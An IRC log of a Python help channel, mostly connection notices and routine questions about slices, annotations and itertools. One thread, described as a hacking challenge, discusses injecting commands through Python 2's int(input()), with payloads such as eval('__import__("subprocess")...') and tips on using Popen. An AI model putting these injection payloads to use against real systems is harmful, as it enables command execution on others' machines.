[05:17:42] *** Server sets mode: +CLcnrtf #python-unregistered
[05:18:05] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 240 seconds)
[05:18:10] *** Joins: CtrlC (~CtrlC@unaffiliated/ctrlc)
[05:18:40] *** Joins: meandi_2 (~meandi_4@dyndsl-031-150-062-163.ewe-ip-backbone.de)
[05:20:28] *** Joins: mandeep (~mandeep@unaffiliated/mandeepb)
[05:20:32] *** Quits: urodna (~urodna@unaffiliated/urodna) (Quit: urodna)
[05:20:33] *** Quits: sunil_bansal (~sunil_ban@123.63.30.29) (Remote host closed the connection)
[05:20:35] *** Quits: mandeep (~mandeep@unaffiliated/mandeepb) (Max SendQ exceeded)
[05:20:40] *** Joins: PulseAsio (~PulseAsio@dw7724211510.amsterdam-tc.dataweb.net)
[05:20:52] *** Quits: ycon_ (~ycon_@103.215.133.5) (Remote host closed the connection)
[05:21:03] *** Joins: mandeep (~mandeep@unaffiliated/mandeepb)
[05:22:05] *** Joins: beerdrop (~beerdrop@c-107-2-115-62.hsd1.mn.comcast.net)
[05:22:34] *** Quits: meandi (~meandi_4@dyndsl-178-142-119-073.ewe-ip-backbone.de) (Ping timeout: 264 seconds)
[05:22:35] *** Quits: CtrlC (~CtrlC@unaffiliated/ctrlc) (Ping timeout: 256 seconds)
[05:23:05] *** Joins: sunil_bansal (~sunil_ban@123.63.30.29)
[05:24:01] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[05:24:04] *** Joins: ycon_ (~ycon_@103.215.133.5)
[05:26:24] <Owner> ?
[05:26:26] *** Quits: Oli (~Oli``@ubuntu/member/oli) (Read error: Connection reset by peer)
[05:26:47] <Owner> why (!)
[05:27:04] *** Quits: doubtful (~abhigenie@dyn-160-39-2-144.dyn.columbia.edu) (Quit: Sleeping. ZZZzzz…)
[05:27:47] *** Joins: polarfire (~polarfire@d58c56d2.rev.dansknet.dk)
[05:28:48] *** Joins: Oli (~Oli``@ubuntu/member/oli)
[05:29:02] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 265 seconds)
[05:30:19] *** bogs is now known as audioburn
[05:31:27] *** Quits: codesoup (~codesoup@174.119.180.211) (Ping timeout: 265 seconds)
[05:31:37] *** Joins: Avinash (~Avinash@unaffiliated/avinash)
[05:32:19] *** Joins: doubtful (~abhigenie@dyn-160-39-2-144.dyn.columbia.edu)
[05:32:29] *** Quits: polarfire (~polarfire@d58c56d2.rev.dansknet.dk) (Ping timeout: 268 seconds)
[05:32:38] <nuxil> im a python 3 noob. i see in python 3 you can do: def foo(bar) -> moo:
[05:32:42] <nuxil> what does this  -> moo: do?
[05:32:44] <doubtful> board[:] = [['B' if c!='T' else 'W' for c in row] for row in board]. Question: why [:]?
[05:32:52] *** Joins: kallesbar (~kallesbar@95.175.104.126)
[05:32:59] *** Quits: _xor (~xor@50.216.161.66.ded-dsl.fuse.net) (Quit: Leaving)
[05:33:26] <odinsbane> doubtful: it assigns the elements of board, vs assigning board.
[05:33:46] <doubtful> odinsbane the difference being?
[05:33:58] *** Quits: skibo (~doblinder@pc-16-125-215-201.cm.vtr.net) (Ping timeout: 264 seconds)
[05:34:10] <papna> nuxil: It's an annotation -- it's used to indicate type. It doesn't change how the function actually works.
[05:34:21] <odinsbane> board is still the same list, so if you had another reference the changes would be reflected.
[05:34:27] <papna> nuxil: Have you seen def foo(bar: woof) -> moo:  ?
[05:34:36] *** Quits: Gustavo6046 (~Gustavo60@unaffiliated/gustavo6046) (Quit: Leaving)
[05:34:39] <papna> nuxil: woof is used to annotate the type of the bar parameter.
[05:34:46] <papna> nuxil: moo is used to annotate the type returned by foo.
[05:34:51] <nuxil> no. i tend to stay away from py3, so this stuff is new to me.
[05:34:51] <doubtful> odinsbane [:] so then lhs and rhs require require to be of same size?
[05:35:36] *** Quits: waterCreature (~waterCrea@203.125.138.178) (Read error: Connection reset by peer)
[05:35:40] <nuxil> papna, thanks
[05:35:41] <mandeep> nuxil: it was only recently added and there's still debate to its usefulness
[05:35:44] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[05:35:48] *** Quits: ycon_ (~ycon_@103.215.133.5) (Remote host closed the connection)
[05:35:51] *** Joins: adoua (~adoua@unaffiliated/adoua)
[05:35:58] <odinsbane> doubtful: no.
[05:36:01] <nuxil> mandeep, i see.
[05:36:24] <doubtful> odinsbane board here is a list of lists.
[05:36:40] *** Quits: Kundry_Wag (~Kundry_Wa@177.18.249.170) (Remote host closed the connection)
[05:36:41] <auscompgeek> mandeep: I'd hardly call 3.0 recent
[05:36:59] <mandeep> auscompgeek: we are talking about pep 484
[05:37:06] <nuxil> im not sure i can see the usefullness of it.
[05:37:21] <auscompgeek> mandeep: no, we're talking about function annotations.
[05:37:41] <mandeep> auscompgeek: in regards to python 3
[05:37:54] <auscompgeek> mandeep: yes. function annotations have been in the language since 3.0.
[05:37:57] <doubtful> I don't understand, I know [:] is used for shallow copy.
[05:37:58] <mandeep> anyway this is buke shedding hwo cares
[05:38:06] <doubtful> what does it do on lhs?
[05:38:17] <doubtful> if possible a simple example would help. :)
[05:38:20] <mandeep> nuxil: i agree but others feel that it's necessary
[05:38:36] *** Joins: andyhuzhill_ (~andyhuzhi@14.23.45.178)
[05:38:47] <meriipu> it indexes into a slice much like board[0] = [1,2,3] sets the first element of board to be a list [1,2,3]
[05:39:21] *** Joins: sdwrage (~textual@172.58.139.5)
[05:39:40] *** Joins: ycon_ (~ycon_@103.215.133.5)
[05:40:10] *** Quits: andyhuzhill_ (~andyhuzhi@14.23.45.178) (Client Quit)
[05:40:27] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 240 seconds)
[05:40:38] *** Joins: andyhuzhill_ (~andyhuzhi@14.23.45.178)
[05:41:14] *** Quits: sunil_bansal (~sunil_ban@123.63.30.29) (Remote host closed the connection)
[05:41:57] *** Quits: sdwrage (~textual@172.58.139.5) (Client Quit)
[05:42:22] *** Quits: andyhuzhill (~andyhuzhi@14.23.45.178) (Ping timeout: 264 seconds)
[05:42:22] *** andyhuzhill_ is now known as andyhuzhill
[05:42:45] *** Joins: phinxy (~ted@unaffiliated/phinxy)
[05:43:00] *** Quits: dfch (~dfch@unaffiliated/dfch) (Ping timeout: 260 seconds)
[05:43:28] *** Joins: dfch (~dfch@unaffiliated/dfch)
[05:43:40] *** Joins: RebelCoder (~RebelCode@82.129.117.5)
[05:43:56] *** Joins: palasso (~palasso@unaffiliated/palasso)
[05:44:04] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[05:44:25] *** Quits: andyhuzhill (~andyhuzhi@14.23.45.178) (Client Quit)
[05:44:29] <odinsbane> doubtful: It ends up being a copy of the rhs, expanding or shrinking as necessary. Being a list of lists doesn't change that.
[05:44:56] <odinsbane> https://paste.pound-python.org/show/qEog9h1JyJ1a86fumrH4/ versus https://paste.pound-python.org/show/F4AgnN92sbxt9Y5GoGgH/
[05:45:01] <doubtful> meriipu Understand that, my confusion is what is this possible then.: a = [1,2,3]; a[:] = a+a
[05:46:01] <doubtful> odinsbane so it is going over and assigning each element. And if the RHS has more elements it extends the list as well?
[05:46:08] <doubtful> seems quite forgiving.
[05:46:17] <odinsbane> doubtful: extends or shrinks.
[05:46:34] <doubtful> I didn't know that, thanks. :)
[05:46:36] *** Joins: andyhuzhill (~andyhuzhi@14.23.45.178)
[05:47:20] *** Quits: andyhuzhill (~andyhuzhi@14.23.45.178) (Read error: Connection reset by peer)
[05:47:34] *** Joins: Cryp71c (~Cryp71c@2600:1700:23d0:aa00:24a2:dfc0:4ec8:f449)
[05:47:42] *** Joins: sunil_bansal (~sunil_ban@123.63.30.29)
[05:47:43] *** Joins: andyhuzhill (~andyhuzhi@14.23.45.178)
[05:48:18] <doubtful> wouldn't board[:][:] be more efficient?
[05:48:26] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 255 seconds)
[05:48:51] *** Quits: psachin (~psachin@42.107.132.243) (Ping timeout: 265 seconds)
[05:49:32] *** Joins: lompik (~lompik@unaffiliated/lompik)
[05:50:47] <odinsbane> What would be efficient about it?
[05:51:34] <KirkMcDonald> x[:][:] is making a copy and then making a copy of that copy.
[05:51:37] *** Joins: fikka (~fikka@5403BEC5.catv.pool.telekom.hu)
[05:52:19] *** Joins: masoudd (~masoudd@5.116.23.94)
[05:52:43] <meriipu> is x[:] on the left hand side a copy too?
[05:52:50] *** Quits: andyhuzhill (~andyhuzhi@14.23.45.178) (Ping timeout: 268 seconds)
[05:52:56] *** Joins: wgas (~wgas@unaffiliated/wgas)
[05:53:03] *** Quits: doubtful (~abhigenie@dyn-160-39-2-144.dyn.columbia.edu) (Quit: Sleeping. ZZZzzz…)
[05:53:22] *** Joins: wuyin (~no1@mobile-166-176-184-254.mycingular.net)
[05:53:49] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[05:55:13] *** Quits: MeGotsThis (~MeGotsThi@cpe-23-241-2-128.socal.res.rr.com) (Ping timeout: 248 seconds)
[05:55:19] *** Joins: doubtful (~abhigenie@dyn-160-39-2-144.dyn.columbia.edu)
[05:55:55] <doubtful> odinsbane if we assign individual each element in the list of lists. I thought that is what [:][:] would do.
[05:56:06] *** Joins: MeGotsThis (~MeGotsThi@cpe-23-241-2-128.socal.res.rr.com)
[05:56:40] <odinsbane> doubtful: you're still making all of the lists on the rhs.
[05:56:52] *** Quits: fikka (~fikka@5403BEC5.catv.pool.telekom.hu) (Ping timeout: 245 seconds)
[05:57:00] <odinsbane> doubtful: I don't know what you meant by efficient. maybe it is.
[05:57:29] *** Joins: [1]MrMobius (~default@c-73-134-82-217.hsd1.va.comcast.net)
[05:57:38] <doubtful> ok so board and board[:] have same efficiency then?
[05:58:25] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 248 seconds)
[05:58:40] <odinsbane> well board[:] is going to copy. So if it is from a list, then it is less efficient in some what. If it is from a generator, it could be more efficient.
[05:59:16] *** Quits: f1y_ (~f1y@archserver/trusteduser/fakeroot) (Quit: exit(0x0))
[05:59:32] *** Quits: carl- (~carl-@h-213-136-53-77.NA.cust.bahnhof.se) (Remote host closed the connection)
[05:59:35] <doubtful> odinsbane what do you mean by copy, isn't it just rebinding board[0] to another list?
[05:59:43] *** Joins: f1y_ (~f1y@archserver/trusteduser/fakeroot)
[06:00:18] <odinsbane> Right, you create one list then you "rebind" all of the elements from that list to the original list. aka copy.
[06:00:25] *** Joins: rudrab (~rudrab@14.139.59.140)
[06:00:33] *** Quits: Driveways_ (~Driveways@216.228.46.200) (Quit: ZNC 1.7.0 - https://znc.in)
[06:00:37] *** Joins: carl- (~carl-@h-213-136-53-77.NA.cust.bahnhof.se)
[06:01:07] *** Quits: MrMobius (~default@c-73-134-82-217.hsd1.va.comcast.net) (Ping timeout: 256 seconds)
[06:01:07] *** [1]MrMobius is now known as MrMobius
[06:01:17] *** Joins: Driveways_ (~Driveways@216.228.46.200)
[06:01:30] <meriipu> I am confused myself about what is different about L = [];  L[:] = [1,2,3] #sets the elements of L to be the single element [1,2,3]   and of L = []; L[:][:] = [1,2,3] # makes no change.  Am I right in assuming this is all syntactic sugar and the first occurence is accounted for by python during the assignment but the second one is treated as a copy?
[06:02:08] *** Joins: andyhuzhill (~andyhuzhi@14.23.45.178)
[06:02:16] <meriipu> I would have thought multiple occurences of [:] on the LHS would just repeatedly index into the same object
[06:02:19] *** Quits: ycon_ (~ycon_@103.215.133.5) (Remote host closed the connection)
[06:03:13] <Omega037> so what is setuptools_scm exactly and why should I use it?
[06:03:23] *** Quits: Sasazuka (~Sasazuka@unaffiliated/sasazuka) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[06:03:50] *** Quits: doubtful (~abhigenie@dyn-160-39-2-144.dyn.columbia.edu) (Quit: Sleeping. ZZZzzz…)
[06:04:02] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[06:04:10] *** Quits: andyhuzhill (~andyhuzhi@14.23.45.178) (Client Quit)
[06:04:32] *** Joins: andyhuzhill (~andyhuzhi@14.23.45.178)
[06:05:04] *** Quits: Miroboru (~myrvoll@133.58.244.158) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[06:05:13] *** Joins: rpkilby (~rpkilby@cpe-76-182-45-76.nc.res.rr.com)
[06:05:44] <rudrab> hi, i am trying a cartesian product using itertools, and getting the following error:
[06:05:48] <rudrab> https://paste.fedoraproject.org/paste/4smkiw~PCU7APQP~CZ-ajw
[06:05:53] *** Joins: light2yellow (~l2y@217.30.64.102)
[06:06:34] <rudrab> i mean, if I define the component as list, it is not working.  WHat I am getting wrong here?
[06:07:09] *** Quits: mandeep (~mandeep@unaffiliated/mandeepb) (Quit: Leaving)
[06:07:19] <Omega037> rudrab, comp is a list of lists
[06:07:22] <Omega037> not two lists
[06:07:31] *** Quits: andyhuzhill (~andyhuzhi@14.23.45.178) (Client Quit)
[06:07:57] <meriipu> itertools.product(*comp):  ?
[06:07:59] <rudrab> oh..sure...true
[06:08:00] *** Joins: psi29a (~psi29a@dD5773DA3.access.telenet.be)
[06:08:03] <rudrab> yes
[06:08:09] <rudrab> thanks a lot
[06:08:11] <Omega037> they need to be separate args
[06:08:12] <Omega037> yeah
[06:08:17] *** Joins: bablux (~bablux@gateway/tor-sasl/cyril1)
[06:08:21] *** Quits: mujjingun (uid228218@gateway/web/irccloud.com/x-rtjzvnvvqzmakhow) (Quit: Connection closed for inactivity)
[06:08:22] <Omega037> no prob
[06:08:27] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 240 seconds)
[06:09:35] *** Quits: rpkilby (~rpkilby@cpe-76-182-45-76.nc.res.rr.com) (Ping timeout: 240 seconds)
[06:10:02] *** Joins: root3d (~root3d@unaffiliated/root3d)
[06:10:08] *** Joins: greg_f (~greg@altlinux/developer/greg)
[06:10:52] *** Joins: andyhuzhill (~andyhuzhi@14.23.45.178)
[06:10:57] *** Joins: psychuil (~psychuil@94.188.155.158)
[06:12:00] *** Joins: blip- (~blip-@unaffiliated/blip-)
[06:12:36] *** Joins: ycon_ (~ycon_@103.215.133.5)
[06:12:46] *** Quits: andyhuzhill (~andyhuzhi@14.23.45.178) (Client Quit)
[06:12:53] *** Quits: blip- (~blip-@unaffiliated/blip-) (Client Quit)
[06:13:31] *** Joins: andyhuzhill (~andyhuzhi@14.23.45.178)
[06:13:45] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[06:14:34] *** Quits: veegee (~veegee@CPE9050cac64033-CM9050cac64030.cpe.net.cable.rogers.com) (Quit: veegee)
[06:14:36] <psychuil> Say, if i have a 3 column dataframe, and i wanna iterate over it in groups by middle column and ordering by the first column, how should i do it? (wanna plot it, so either iterate it, orbreak it up arrays or serieses or something)
[06:14:55] *** Joins: pathrocle (~pathrocle@ldap.nchadvisors.ro)
[06:16:00] *** Quits: sunil_bansal (~sunil_ban@123.63.30.29) (Remote host closed the connection)
[06:16:16] *** Quits: plutoniix (~q@175.176.222.7) (Quit: Leaving)
[06:16:34] *** Quits: andyhuzhill (~andyhuzhi@14.23.45.178) (Client Quit)
[06:16:37] *** Joins: Deusdeorum (~Deusdeoru@unaffiliated/deusdeorum)
[06:17:01] *** Joins: andyhuzhill (~andyhuzhi@14.23.45.178)
[06:17:04] *** Quits: root3d (~root3d@unaffiliated/root3d) (Remote host closed the connection)
[06:17:07] *** Quits: led_ir22 (~Thunderbi@hotspot10.rywasoft.net) (Quit: led_ir22)
[06:17:36] *** Joins: rudrab_ (~rudrab@14.139.59.140)
[06:17:48] *** Joins: knifefork (~textual@pool-173-48-186-26.bstnma.fios.verizon.net)
[06:18:06] *** Joins: doubtful (~abhigenie@dyn-160-39-2-144.dyn.columbia.edu)
[06:18:44] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 268 seconds)
[06:18:55] <doubtful> I got disconnected any logs of chat?
[06:19:45] *** Quits: rudrab (~rudrab@14.139.59.140) (Ping timeout: 260 seconds)
[06:19:45] *** rudrab_ is now known as rudrab
[06:20:10] *** Quits: MoarSpaceFi (~Forgot_my@65.126.126.193) (Quit: Leaving)
[06:20:24] <meriipu> doubtful: not anything related to the list indexing
[06:20:26] *** Joins: led_ir22 (~Thunderbi@hotspot10.rywasoft.net)
[06:20:53] *** Quits: internalsplit (~internals@c-24-16-133-129.hsd1.wa.comcast.net) (Ping timeout: 276 seconds)
[06:23:03] *** Quits: andyhuzhill (~andyhuzhi@14.23.45.178) (Ping timeout: 268 seconds)
[06:23:37] *** Joins: andyhuzhill (~andyhuzhi@14.23.45.178)
[06:25:00] *** Quits: IanLiu (~IanLiu@189-69-38-63.dsl.telesp.net.br) (Quit: IanLiu)
[06:25:05] *** Quits: antgel (~topdog@87.71.0.54) (Ping timeout: 240 seconds)
[06:25:24] *** Joins: Norore (~Norore@mic92-8-82-230-161-45.fbx.proxad.net)
[06:25:55] *** Quits: Technodrome (~textual@unaffiliated/technodrome) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[06:26:07] *** Joins: uttam (~uttam@vpn.bose.res.in)
[06:27:02] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[06:27:03] *** Joins: Kundry_Wag (~Kundry_Wa@177.18.249.170)
[06:27:57] *** Quits: xliiv (~xliiv@d89-122.icpnet.pl) (Ping timeout: 240 seconds)
[06:28:05] <`7hr34t_hvntr> hm
[06:28:14] *** Joins: rudrab_ (~rudrab@14.139.59.140)
[06:28:25] *** Joins: ketralnis (~ketralnis@reddit/admins/ketralnis)
[06:29:02] *** Quits: ycon_ (~ycon_@103.215.133.5) (Remote host closed the connection)
[06:29:31] *** Quits: Albori_ (~Albori@64-251-150-33.fidnet.com) (Quit: Albori_)
[06:29:38] <`7hr34t_hvntr> if there's an int(input()) function in some code and we want to inject commands - how do we do this without causing errors due to the int() outer function
[06:29:58] *** Joins: sunil_bansal (~sunil_ban@123.63.30.29)
[06:30:27] <MrElendig> doubt int() have any holes in it
[06:30:27] *** Quits: rudrab (~rudrab@14.139.59.140) (Ping timeout: 268 seconds)
[06:30:28] *** rudrab_ is now known as rudrab
[06:30:29] <`7hr34t_hvntr> my guess is the input() which acts as eval() would evaluate prior to any errors being thrown by the int() function
[06:30:41] <liste> `7hr34t_hvntr: py2 or py3?
[06:30:47] <`7hr34t_hvntr> i believe this thing is running 2
[06:30:50] <MrElendig> input does not eval on py3
[06:31:02] <`7hr34t_hvntr> 2. its an old machine
[06:31:21] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 240 seconds)
[06:31:26] <MrElendig> strange for it to int() around on py2
[06:31:48] <`7hr34t_hvntr> meant to make it harder probably
[06:32:06] <`7hr34t_hvntr> (some hacking challenge)
[06:32:08] <meriipu> int(input()); and enter something like  [0, eval("1+1")][0]  ?
[06:32:20] <liste> `7hr34t_hvntr: "mycommand() or 0" if mycommand() returns 0
[06:32:23] <liste> None*
[06:32:56] *** Joins: adamholmberg (~adamholmb@69.80.114.120)
[06:33:00] <`7hr34t_hvntr> when i was throwing ; in, it was returning EOF/EOL errors. i'll try these things though
[06:33:43] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[06:34:18] *** Joins: xliiv (~xliiv@d89-122.icpnet.pl)
[06:35:34] *** Joins: `7hr3t_hvntr` (~ThePortWh@unaffiliated/theportwhisperer)
[06:36:58] *** Quits: n35xdxb0 (~n35xdxb0@cpc130684-camd16-2-0-cust846.know.cable.virginm.net) (Ping timeout: 264 seconds)
[06:37:21] *** Quits: adamholmberg (~adamholmb@69.80.114.120) (Ping timeout: 240 seconds)
[06:37:38] <`7hr3t_hvntr`> okay
[06:38:01] *** Quits: `7hr34t_hvntr (~ThePortWh@unaffiliated/theportwhisperer) (Quit: Leaving)
[06:38:02] *** Joins: chele (~chele@2a02:8106:1:f900:faca:b8ff:fe2f:8499)
[06:38:02] *** Joins: Draecos (~Draecos@203.121.220.138)
[06:38:08] <`7hr3t_hvntr`> https://gist.github.com/PortWhisperer/3e5661b05ad458a554ff04eea4fc89ba
[06:38:09] *** Quits: Binake (~test@202.107.210.51) (Ping timeout: 256 seconds)
[06:38:24] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 256 seconds)
[06:38:46] *** Joins: n35xdxb0 (~n35xdxb0@81.171.98.49)
[06:38:58] *** Joins: Binake (~test@202.107.210.51)
[06:39:07] *** Quits: albel727 (~albel727@unaffiliated/albel727) (Ping timeout: 265 seconds)
[06:39:07] *** Joins: max_m (~max_m@gateway/tor-sasl/maxm/x-47377621)
[06:39:43] <`7hr3t_hvntr`> can't figure out how to escape that function..EOF/EOL errors
[06:39:53] *** Quits: light2yellow (~l2y@217.30.64.102) (Quit: light2yellow)
[06:40:14] <wleslie> `7hr3t_hvntr`: you got given two ways to do it
[06:40:32] *** Joins: Saukk (~Saukk@91-156-131-210.elisa-laajakaista.fi)
[06:40:32] <wleslie> `7hr3t_hvntr`: there's no string literal, don't bother with quotes
[06:40:54] *** Joins: `7hr34t_hvntr (~ThePortWh@unaffiliated/theportwhisperer)
[06:40:58] *** Joins: }ls{ (~kalle@unaffiliated/ls/x-8089558)
[06:41:12] *** Joins: root3d (~root3d@unaffiliated/root3d)
[06:41:39] *** Joins: u0m3 (~u0m3@5-12-121-163.residential.rdsnet.ro)
[06:42:19] <wleslie> `7hr3t_hvntr: there's no string literal, don't bother with quotes
[06:42:32] *** AnySomebody_ is now known as AnySomebody
[06:43:53] <wleslie> `7hr3t_hvntr`: just remember that you can only evaluate /expressions/, wheras ; is the statement separator
[06:46:02] *** Joins: ycon_ (~ycon_@103.215.133.5)
[06:46:03] *** Joins: nazarewk (~nazarewk@1d23810ffe137.rev.snt.net.pl)
[06:47:34] *** Quits: isokee (~isokee@unaffiliated/isokee) (Quit: ZZZzzzz...)
[06:47:48] *** Quits: unpythonic (~unpythoni@c-98-207-240-139.hsd1.ca.comcast.net) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[06:47:48] *** Joins: dmoliveira (~danilo@danilo-desktop.zdv.uni-mainz.de)
[06:47:58] *** Joins: Tucky (~Tucky@4.235.17.93.rev.sfr.net)
[06:48:13] *** Joins: UncleVasya (~UncleVasy@185-94-213-142.dynamic.ktkru.ru)
[06:48:22] *** Joins: BeforeClick (a5e148ed@gateway/web/freenode/ip.165.225.72.237)
[06:48:24] *** Joins: unpythonic (~unpythoni@c-98-207-240-139.hsd1.ca.comcast.net)
[06:48:35] *** Quits: unpythonic (~unpythoni@c-98-207-240-139.hsd1.ca.comcast.net) (Client Quit)
[06:49:04] *** Joins: unpythonic (~unpythoni@c-98-207-240-139.hsd1.ca.comcast.net)
[06:49:06] <`7hr3t_hvntr`> hm interesting
[06:49:22] *** Quits: unpythonic (~unpythoni@c-98-207-240-139.hsd1.ca.comcast.net) (Client Quit)
[06:50:18] <`7hr3t_hvntr`> i was misinterpreting the quotes in the input('msg: ') and forgetting those quotes aren't for anything but the prompt displayed on stdout
[06:50:29] <`7hr3t_hvntr`>  :|
[06:50:30] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[06:50:40] *** Quits: lastmanstanding (~arjoonn@202.191.67.138) (Ping timeout: 260 seconds)
[06:50:43] *** Quits: nazarewk (~nazarewk@1d23810ffe137.rev.snt.net.pl) (Client Quit)
[06:51:25] *** Joins: tuxiano (~tuxiano@2a02:8070:89d4:aa00:a531:21b4:403f:c0a9)
[06:52:10] *** Joins: truthr (~truthr@unaffiliated/truthr)
[06:52:31] *** Joins: roadie (~user@82.102.31.40)
[06:53:12] *** Joins: AliGeyik (~Thunderbi@82.222.185.98)
[06:54:02] *** Quits: StygianBlues (~StygianBl@74-194-176-205.chstcmtk03.res.dyn.suddenlink.net) (Ping timeout: 276 seconds)
[06:54:34] <fleetfox> Is there a way to ommit positional argument without collecting everything into list first? https://dpaste.de/ZKPc/raw
[06:54:56] *** Joins: callMe_Dude (~callMe_Du@117.221.144.188)
[06:54:59] <callMe_Dude> hi
[06:55:13] *** Joins: ellyacht (~Android@unaffiliated/ellyacht)
[06:55:13] <callMe_Dude> what are noob/begginer python channels ?
[06:55:19] *** Joins: StygianBlues (~StygianBl@74-194-176-205.chstcmtk03.res.dyn.suddenlink.net)
[06:55:25] *** Joins: orekix (~orekix@202.182.97.194)
[06:55:45] <wleslie> callMe_Dude: here is fine
[06:55:52] <BeforeClick> grashopper you'll always be a noob so just post here :)
[06:56:46] <wleslie> fleetfox: no; but is this xml format already specified or are you making it up?
[06:56:55] *** Joins: nazarewk (~nazarewk@1d23810ffe137.rev.snt.net.pl)
[06:57:06] *** Joins: robstr (~rsoeldner@ip1f12f907.dynamic.kabel-deutschland.de)
[06:57:19] *** Joins: Mayurvpatil (~mayurvpat@123.201.35.174)
[06:57:41] <robstr> Morning
[06:57:59] <fleetfox> wleslie: i know it's annoying but i need it ordered
[06:58:02] *** Joins: derk0pf (~derk0pf@p5497B8F0.dip0.t-ipconnect.de)
[06:58:07] <`7hr3t_hvntr`> eval('__import__("subprocess").getoutput("ls")') throws error AttributeError:'module' object has no attribute 'getoutpu9t'
[06:58:10] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 245 seconds)
[06:58:16] <`7hr3t_hvntr`> is this some sort of deprecated technique
[06:58:29] *** Joins: wilbert_ (wilbert@gateway/vpn/privateinternetaccess/wilbert)
[06:58:31] <wleslie> `7hr3t_hvntr`: getoutput did not exist in python 2
[06:58:45] *** Joins: Albori (~Albori@64-251-150-33.fidnet.com)
[06:58:47] <`7hr3t_hvntr`> ah...interesting
[06:58:48] <wleslie> `7hr3t_hvntr`: use Popen, like all the new function do anyway
[06:58:48] *** Joins: lbalhar (~lbalhar@93.185.13.26)
[06:58:49] <fleetfox> if it were up to me i wouldn't use XML at all
[06:59:27] <wleslie> fleetfox: you'll have to bust it out into a list, then, or add the children to the element manually
[07:00:11] <psychuil> Say, if i have a 3 column dataframe, and i wanna iterate over it in groups by middle column and ordering by the first column, how should i do it? (wanna plot it, so either iterate it, orbreak it up arrays or serieses or something)
[07:00:12] *** Quits: wilbert (~wilbert@unaffiliated/wilbert) (Ping timeout: 245 seconds)
[07:00:21] *** Quits: Kundry_Wag (~Kundry_Wa@177.18.249.170) (Ping timeout: 240 seconds)
[07:00:27] *** Joins: Tichodroma (~lutz@fsf/member/Tichodroma)
[07:00:55] *** Joins: mreznik (mreznik@nat/redhat/x-xxfjkjflgvgltcwh)
[07:00:57] *** Quits: stevie_ (~stevie@salvato.cslabs.clarkson.edu) (Ping timeout: 240 seconds)
[07:01:07] <fleetfox> maybe there is some clever trick along the lines of what i already have?
[07:01:41] *** Joins: akkadian (~akkadian@unaffiliated/akkadian)
[07:02:07] <`7hr3t_hvntr`> from the terminal, is  `__import__("subprocess"),__import__("os")` the proper way to import multiple modules?
[07:02:35] <wleslie> fleetfox: ah, it's just one optional value?
[07:02:45] <fleetfox> yeah
[07:02:50] <fleetfox> i want to ommit positional argument
[07:02:56] *** Joins: foxmask (uid302052@gateway/web/irccloud.com/x-tbwkttvzdhjnklxq)
[07:03:32] <wleslie> `7hr3t_hvntr`: you would call __import__ multiple times, yes, but remember that you only have expressions - the position of the call needs to be where you can use the resulting module object
[07:03:55] *** Joins: SopaXorzTaker (~SopaXorzT@unaffiliated/sopaxorztaker)
[07:04:01] *** Quits: chowmeined (~chowmeine@unaffiliated/chowmeined) (Ping timeout: 248 seconds)
[07:04:07] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[07:04:43] *** Joins: _MAXIMUS_ (~MAXIMUS@71.177.158.202)
[07:04:46] *** Joins: chowmeined (~chowmeine@unaffiliated/chowmeined)
[07:04:50] *** Joins: |oLa| (~|_oLa_|@2a00:23c5:8c0e:9900:d996:2f3e:f2a7:86e6)
[07:05:17] *** Joins: feuillemorte (irc@nat/redhat/x-hpxcvvwzjejwmzdf)
[07:05:22] *** Joins: bartmon (~bartmon@89-212-95-222.link.t-2.net)
[07:05:45] <robstr> i want to check if a list contains a object based on content, not reference, doing it with `if x in y` is wrong, right ?
[07:05:54] *** Joins: rpkilby (~rpkilby@cpe-76-182-45-76.nc.res.rr.com)
[07:05:57] *** Quits: roadie (~user@82.102.31.40) (Ping timeout: 240 seconds)
[07:06:38] *** Quits: Sylhouette (~johan@62.12.9.66) (Remote host closed the connection)
[07:06:39] <ikanobori> Can you implement __eq__ on that object?
[07:06:57] <wleslie> fleetfox: I'd be tempted to just .append() to the product
[07:07:01] <robstr> ikanobori: yes i can, is this the way to go ?
[07:07:14] <fleetfox> wleslie: order is important
[07:07:17] <ikanobori> robstr: Generally, yes. And use a set if your lists are unique.
[07:07:31] *** Joins: RCStef (~Thunderbi@conect.gtstelecom.ro)
[07:07:34] <wleslie> fleetfox: so append in the correct order?
[07:07:45] <fleetfox> oh, right i got what you are saying
[07:07:47] <robstr> ikanobori: makes sense, thank you
[07:07:54] <fleetfox> append in chunks. Thanks
[07:08:01] *** Joins: fr0ddy (~fr0ddy@49.248.66.98)
[07:08:16] *** Quits: uttam (~uttam@vpn.bose.res.in) (Quit: uttam)
[07:08:35] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 240 seconds)
[07:09:21] *** Quits: Cryp71c (~Cryp71c@2600:1700:23d0:aa00:24a2:dfc0:4ec8:f449) (Read error: Connection reset by peer)
[07:09:22] *** Quits: ycon_ (~ycon_@103.215.133.5) (Remote host closed the connection)
[07:09:25] *** Quits: Mechanismus (~LabMonkey@2602:306:cf62:e270:9480:5b34:5fe9:a76) (Read error: Connection reset by peer)
[07:09:31] *** Quits: orekix (~orekix@202.182.97.194) (Quit: bye)
